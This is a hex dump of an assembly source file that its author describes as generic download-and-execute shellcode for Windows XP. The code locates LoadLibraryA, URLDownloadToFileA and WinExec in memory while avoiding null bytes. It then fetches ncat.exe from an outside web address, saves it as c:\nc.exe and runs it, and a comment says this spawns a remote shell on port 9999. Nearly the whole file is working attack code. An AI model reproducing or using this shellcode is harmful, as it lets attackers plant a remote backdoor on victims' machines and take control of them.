00000000  3b 20 4e 69 63 65 20 74  68 65 6f 72 68 65 74 69  |; Nice theorheti|
00000010  63 61 6c 6c 79 20 67 65  6e 65 72 69 63 20 75 72  |cally generic ur|
00000020  6c 20 64 6f 77 6e 6c 6f  61 64 20 61 6e 64 20 65  |l download and e|
00000030  78 65 63 75 74 65 0d 0a  3b 20 73 68 65 6c 6c 63  |xecute..; shellc|
00000040  6f 64 65 20 66 6f 72 20  57 69 6e 64 6f 77 73 20  |ode for Windows |
00000050  58 50 2e 0d 0a 3b 0d 0a  3b 20 48 65 63 6b 2c 20  |XP...;..; Heck, |
00000060  61 74 6c 65 61 73 74 20  69 74 20 73 61 76 65 73  |atleast it saves|
00000070  20 79 6f 75 20 75 73 69  6e 67 20 74 66 74 70 21  | you using tftp!|
00000080  0d 0a 3b 0d 0a 3b 20 50  65 74 65 72 34 30 32 30  |..;..; Peter4020|
00000090  40 68 6f 74 6d 61 69 6c  2e 63 6f 6d 0d 0a 3b 0d  |@hotmail.com..;.|
000000a0  0a 3b 20 6e 61 73 6d 77  20 2d 73 20 2d 66 62 69  |.; nasmw -s -fbi|
000000b0  6e 20 2d 6f 20 64 6f 77  6e 6c 6f 61 64 2e 73 20  |n -o download.s |
000000c0  64 6f 77 6e 6c 6f 61 64  2e 61 73 6d 0d 0a 0d 0a  |download.asm....|
000000d0  62 69 74 73 20 33 32 0d  0a 0d 0a 73 74 61 72 74  |bits 32....start|
000000e0  3a 0d 0a 6a 6d 70 20 73  68 6f 72 74 20 61 76 6f  |:..jmp short avo|
000000f0  69 64 6e 61 73 74 79 6e  75 6c 6c 73 0d 0a 0d 0a  |idnastynulls....|
00000100  63 6f 6e 74 69 6e 75 65  3a 0d 0a 70 6f 70 20 65  |continue:..pop e|
00000110  64 69 09 09 09 09 3b 20  65 64 69 20 3d 20 27 75  |di....; edi = 'u|
00000120  72 6c 6d 6f 6e 2e 64 6c  6c 27 0d 0a 6d 6f 76 20  |rlmon.dll'..mov |
00000130  65 73 69 2c 20 65 64 69  0d 0a 6d 6f 76 20 61 6c  |esi, edi..mov al|
00000140  2c 20 30 66 66 68 0d 0a  72 65 70 6e 65 20 73 63  |, 0ffh..repne sc|
00000150  61 73 62 0d 0a 69 6e 63  20 62 79 74 65 20 5b 65  |asb..inc byte [e|
00000160  64 69 2d 30 31 68 5d 09  09 3b 20 65 64 69 20 3d  |di-01h]..; edi =|
00000170  20 73 74 72 69 6e 67 20  6f 66 20 75 72 6c 0d 0a  | string of url..|
00000180  6d 6f 76 20 65 62 78 2c  20 65 64 69 0d 0a 6d 6f  |mov ebx, edi..mo|
00000190  76 20 61 6c 2c 20 30 66  66 68 0d 0a 72 65 70 6e  |v al, 0ffh..repn|
000001a0  65 20 73 63 61 73 62 0d  0a 69 6e 63 20 62 79 74  |e scasb..inc byt|
000001b0  65 20 5b 65 64 69 2d 30  31 68 5d 09 09 3b 20 65  |e [edi-01h]..; e|
000001c0  64 69 20 3d 20 70 61 74  68 20 6f 66 20 64 6f 77  |di = path of dow|
000001d0  6e 6c 6f 61 64 0d 0a 6d  6f 76 20 65 64 78 2c 20  |nload..mov edx, |
000001e0  65 64 69 0d 0a 72 65 70  6e 65 20 73 63 61 73 62  |edi..repne scasb|
000001f0  0d 0a 69 6e 63 20 62 79  74 65 20 5b 65 64 69 2d  |..inc byte [edi-|
00000200  30 31 68 5d 0d 0a 70 75  73 68 20 65 64 78 0d 0a  |01h]..push edx..|
00000210  0d 0a 70 75 73 68 20 65  62 78 0d 0a 70 75 73 68  |..push ebx..push|
00000220  20 65 64 78 0d 0a 70 75  73 68 20 65 73 69 0d 0a  | edx..push esi..|
00000230  0d 0a 6d 6f 76 20 65 62  78 2c 20 30 63 32 35 62  |..mov ebx, 0c25b|
00000240  35 65 66 66 68 0d 0a 6d  6f 76 20 65 63 78 2c 20  |5effh..mov ecx, |
00000250  30 64 65 61 64 63 30 64  65 68 0d 0a 6d 6f 76 20  |0deadc0deh..mov |
00000260  65 64 69 2c 20 37 37 65  36 30 31 30 31 68 0d 0a  |edi, 77e60101h..|
00000270  0d 0a 74 72 61 77 6c 6d  65 6d 3a 0d 0a 69 6e 63  |..trawlmem:..inc|
00000280  20 65 64 69 0d 0a 6d 6f  76 20 61 6c 2c 20 30 66  | edi..mov al, 0f|
00000290  66 68 0d 0a 72 65 70 6e  65 20 73 63 61 73 62 0d  |fh..repne scasb.|
000002a0  0a 6a 6d 70 20 73 68 6f  72 74 20 63 68 65 63 6b  |.jmp short check|
000002b0  62 79 74 65 73 0d 0a 6e  6f 70 0d 0a 0d 0a 63 68  |bytes..nop....ch|
000002c0  65 63 6b 62 79 74 65 73  3a 0d 0a 64 65 63 20 65  |eckbytes:..dec e|
000002d0  64 69 0d 0a 70 75 73 68  20 64 77 6f 72 64 20 5b  |di..push dword [|
000002e0  65 64 69 5d 0d 0a 70 6f  70 20 65 73 69 0d 0a 63  |edi]..pop esi..c|
000002f0  6d 70 20 65 62 78 2c 20  65 73 69 0d 0a 6a 65 20  |mp ebx, esi..je |
00000300  73 68 6f 72 74 20 67 6f  74 63 68 61 0d 0a 6a 6d  |short gotcha..jm|
00000310  70 20 73 68 6f 72 74 20  74 72 61 77 6c 6d 65 6d  |p short trawlmem|
00000320  0d 0a 0d 0a 6a 6d 70 20  73 68 6f 72 74 20 70 61  |....jmp short pa|
00000330  73 74 70 6f 69 6e 74 0d  0a 0d 0a 61 76 6f 69 64  |stpoint....avoid|
00000340  6e 61 73 74 79 6e 75 6c  6c 73 3a 0d 0a 6a 6d 70  |nastynulls:..jmp|
00000350  20 73 68 6f 72 74 20 64  61 74 61 0d 0a 0d 0a 70  | short data....p|
00000360  61 73 74 70 6f 69 6e 74  3a 0d 0a 0d 0a 67 6f 74  |astpoint:....got|
00000370  63 68 61 3a 0d 0a 6c 65  61 20 65 61 78 2c 20 5b  |cha:..lea eax, [|
00000380  65 64 69 2d 32 65 68 5d  09 09 3b 20 67 65 74 20  |edi-2eh]..; get |
00000390  74 6f 20 73 74 61 72 74  20 6f 66 20 6c 6f 61 64  |to start of load|
000003a0  6c 69 62 72 61 72 79 61  20 66 75 6e 63 74 69 6f  |librarya functio|
000003b0  6e 0d 0a 63 61 6c 6c 20  65 61 78 09 09 09 3b 20  |n..call eax...; |
000003c0  63 61 6c 6c 20 6c 6f 61  64 6c 69 62 72 61 72 79  |call loadlibrary|
000003d0  61 0d 0a 0d 0a 70 6f 70  20 65 64 78 0d 0a 70 6f  |a....pop edx..po|
000003e0  70 20 65 62 78 0d 0a 0d  0a 70 75 73 68 20 65 64  |p ebx....push ed|
000003f0  78 0d 0a 78 6f 72 20 65  63 78 2c 20 65 63 78 0d  |x..xor ecx, ecx.|
00000400  0a 70 75 73 68 20 65 63  78 0d 0a 70 75 73 68 20  |.push ecx..push |
00000410  65 63 78 0d 0a 70 75 73  68 20 65 64 78 09 09 09  |ecx..push edx...|
00000420  3b 20 70 61 74 68 20 6f  66 20 64 6f 77 6e 6c 6f  |; path of downlo|
00000430  61 64 0d 0a 70 75 73 68  20 65 62 78 09 09 09 3b  |ad..push ebx...;|
00000440  20 75 72 6c 20 6f 66 20  64 6f 77 6e 6c 6f 61 64  | url of download|
00000450  0d 0a 70 75 73 68 20 65  63 78 0d 0a 0d 0a 6d 6f  |..push ecx....mo|
00000460  76 20 65 62 78 2c 20 38  64 38 64 35 36 30 32 68  |v ebx, 8d8d5602h|
00000470  0d 0a 6d 6f 76 20 65 63  78 2c 20 30 62 61 64 63  |..mov ecx, 0badc|
00000480  30 64 65 64 68 0d 0a 6d  6f 76 20 65 64 69 2c 20  |0dedh..mov edi, |
00000490  65 61 78 09 09 09 3b 20  65 61 78 20 3d 20 62 61  |eax...; eax = ba|
000004a0  73 65 20 6f 66 20 75 72  6c 6d 6f 6e 2e 64 6c 6c  |se of urlmon.dll|
000004b0  0d 0a 0d 0a 74 72 61 77  6c 6d 65 6d 32 3a 0d 0a  |....trawlmem2:..|
000004c0  69 6e 63 20 65 64 69 0d  0a 6d 6f 76 20 61 6c 2c  |inc edi..mov al,|
000004d0  20 30 30 32 68 0d 0a 72  65 70 6e 65 20 73 63 61  | 002h..repne sca|
000004e0  73 62 0d 0a 6a 6d 70 20  73 68 6f 72 74 20 63 68  |sb..jmp short ch|
000004f0  65 63 6b 62 79 74 65 73  32 0d 0a 6e 6f 70 0d 0a  |eckbytes2..nop..|
00000500  0d 0a 63 68 65 63 6b 62  79 74 65 73 32 3a 0d 0a  |..checkbytes2:..|
00000510  64 65 63 20 65 64 69 0d  0a 70 75 73 68 20 64 77  |dec edi..push dw|
00000520  6f 72 64 20 5b 65 64 69  5d 0d 0a 70 6f 70 20 65  |ord [edi]..pop e|
00000530  73 69 0d 0a 63 6d 70 20  65 62 78 2c 20 65 73 69  |si..cmp ebx, esi|
00000540  0d 0a 6a 65 20 73 68 6f  72 74 20 67 6f 74 63 68  |..je short gotch|
00000550  61 32 0d 0a 6a 6d 70 20  73 68 6f 72 74 20 74 72  |a2..jmp short tr|
00000560  61 77 6c 6d 65 6d 32 0d  0a 0d 0a 67 6f 74 63 68  |awlmem2....gotch|
00000570  61 32 3a 0d 0a 6c 65 61  20 65 61 78 2c 20 5b 65  |a2:..lea eax, [e|
00000580  64 69 2d 31 62 68 5d 09  09 3b 20 67 65 74 20 74  |di-1bh]..; get t|
00000590  6f 20 73 74 61 72 74 20  6f 66 20 75 72 6c 64 6f  |o start of urldo|
000005a0  77 6e 6c 6f 61 64 74 6f  66 69 6c 65 61 20 66 75  |wnloadtofilea fu|
000005b0  6e 63 74 69 6f 6e 0d 0a  63 61 6c 6c 20 65 61 78  |nction..call eax|
000005c0  09 09 09 3b 20 63 61 6c  6c 20 75 72 6c 64 6f 77  |...; call urldow|
000005d0  6e 6c 6f 61 64 74 6f 66  69 6c 65 61 0d 0a 0d 0a  |nloadtofilea....|
000005e0  70 6f 70 20 65 64 78 0d  0a 78 6f 72 20 65 63 78  |pop edx..xor ecx|
000005f0  2c 20 65 63 78 0d 0a 3b  69 6e 63 20 65 63 78 0d  |, ecx..;inc ecx.|
00000600  0a 70 75 73 68 20 65 63  78 0d 0a 70 75 73 68 20  |.push ecx..push |
00000610  65 64 78 0d 0a 0d 0a 6d  6f 76 20 65 62 78 2c 20  |edx....mov ebx, |
00000620  30 63 34 35 38 62 36 36  68 0d 0a 6d 6f 76 20 65  |0c458b66h..mov e|
00000630  63 78 2c 20 31 33 33 37  66 30 30 64 68 0d 0a 6d  |cx, 1337f00dh..m|
00000640  6f 76 20 65 64 69 2c 20  37 37 65 36 30 31 30 31  |ov edi, 77e60101|
00000650  68 0d 0a 0d 0a 74 72 61  77 6c 6d 65 6d 33 3a 0d  |h....trawlmem3:.|
00000660  0a 69 6e 63 20 65 64 69  0d 0a 6d 6f 76 20 61 6c  |.inc edi..mov al|
00000670  2c 20 30 36 36 68 0d 0a  72 65 70 6e 65 20 73 63  |, 066h..repne sc|
00000680  61 73 62 0d 0a 6a 6d 70  20 73 68 6f 72 74 20 63  |asb..jmp short c|
00000690  68 65 63 6b 62 79 74 65  73 33 0d 0a 6e 6f 70 0d  |heckbytes3..nop.|
000006a0  0a 0d 0a 63 68 65 63 6b  62 79 74 65 73 33 3a 0d  |...checkbytes3:.|
000006b0  0a 64 65 63 20 65 64 69  0d 0a 70 75 73 68 20 64  |.dec edi..push d|
000006c0  77 6f 72 64 20 5b 65 64  69 5d 0d 0a 70 6f 70 20  |word [edi]..pop |
000006d0  65 73 69 0d 0a 63 6d 70  20 65 62 78 2c 20 65 73  |esi..cmp ebx, es|
000006e0  69 0d 0a 6a 65 20 73 68  6f 72 74 20 67 6f 74 63  |i..je short gotc|
000006f0  68 61 33 0d 0a 6a 6d 70  20 73 68 6f 72 74 20 74  |ha3..jmp short t|
00000700  72 61 77 6c 6d 65 6d 33  0d 0a 0d 0a 67 6f 74 63  |rawlmem3....gotc|
00000710  68 61 33 3a 0d 0a 6c 65  61 20 65 61 78 2c 20 5b  |ha3:..lea eax, [|
00000720  65 64 69 2d 31 36 68 5d  09 09 3b 20 67 65 74 20  |edi-16h]..; get |
00000730  74 6f 20 73 74 61 72 74  20 6f 66 20 77 69 6e 65  |to start of wine|
00000740  78 65 63 20 66 75 6e 63  74 69 6f 6e 0d 0a 63 61  |xec function..ca|
00000750  6c 6c 20 65 61 78 09 09  09 3b 20 63 61 6c 6c 20  |ll eax...; call |
00000760  77 69 6e 65 78 65 63 0d  0a 0d 0a 6d 6f 76 20 65  |winexec....mov e|
00000770  63 78 2c 20 30 64 65 61  64 63 30 64 65 68 0d 0a  |cx, 0deadc0deh..|
00000780  69 6e 66 6c 6f 6f 70 3a  09 09 09 3b 20 69 6e 66  |infloop:...; inf|
00000790  69 6e 69 74 65 20 6c 6f  6f 70 3b 20 6e 6f 20 63  |inite loop; no c|
000007a0  72 61 73 68 20 77 68 65  6e 20 64 6f 6e 65 0d 0a  |rash when done..|
000007b0  69 6e 63 20 65 63 78 0d  0a 63 6d 70 20 65 63 78  |inc ecx..cmp ecx|
000007c0  2c 20 30 62 61 64 63 30  64 65 64 68 0d 0a 6c 6f  |, 0badc0dedh..lo|
000007d0  6f 70 6e 7a 20 69 6e 66  6c 6f 6f 70 09 09 09 3b  |opnz infloop...;|
000007e0  20 69 66 20 74 68 69 73  20 73 6c 6f 77 73 20 79  | if this slows y|
000007f0  6f 75 20 64 6f 77 6e 20  74 6f 6f 20 6d 75 63 68  |ou down too much|
00000800  2c 20 72 65 6d 6f 76 65  20 69 74 21 0d 0a 0d 0a  |, remove it!....|
00000810  69 6e 74 20 33 68 0d 0a  0d 0a 64 61 74 61 3a 0d  |int 3h....data:.|
00000820  0a 63 61 6c 6c 20 63 6f  6e 74 69 6e 75 65 0d 0a  |.call continue..|
00000830  64 62 20 27 55 52 4c 4d  4f 4e 2e 44 4c 4c 27 2c  |db 'URLMON.DLL',|
00000840  20 30 66 66 68 0d 0a 64  62 20 27 68 74 74 70 3a  | 0ffh..db 'http:|
00000850  2f 2f 77 77 77 2e 65 6c  69 74 65 68 61 76 65 6e  |//www.elitehaven|
00000860  2e 6e 65 74 2f 6e 63 61  74 2e 65 78 65 27 2c 20  |.net/ncat.exe', |
00000870  30 66 66 68 09 3b 20 74  68 65 20 66 69 6c 65 20  |0ffh.; the file |
00000880  61 74 20 74 68 69 73 20  61 64 64 72 65 73 73 20  |at this address |
00000890  73 70 61 77 6e 73 20 72  65 6d 6f 74 65 20 73 68  |spawns remote sh|
000008a0  65 6c 6c 20 6f 6e 20 70  6f 72 74 20 39 39 39 39  |ell on port 9999|
000008b0  0d 0a 64 62 20 27 63 3a  5c 6e 63 2e 65 78 65 27  |..db 'c:\nc.exe'|
000008c0  2c 20 30 66 66 68                                 |, 0ffh|
000008c6
